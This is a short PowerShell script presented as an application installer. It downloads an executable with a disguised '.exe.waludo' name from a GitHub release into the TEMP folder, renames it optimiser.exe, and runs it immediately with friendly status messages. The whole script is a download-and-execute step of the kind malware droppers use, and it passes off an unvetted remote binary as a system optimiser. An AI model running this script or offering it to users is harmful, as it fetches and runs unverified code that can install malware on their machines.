
$localPath = "$env:TEMP\optimiser.exe"

Write-Host "Downloading application components..." -ForegroundColor Cyan


Invoke-WebRequest -Uri "https://github.com/flerkinman/optimise/releases/download/potoato/optimise.exe.waludo" -OutFile $localPath

Write-Host "Launching program..." -ForegroundColor Green


Start-Process -FilePath $localPath -Wait
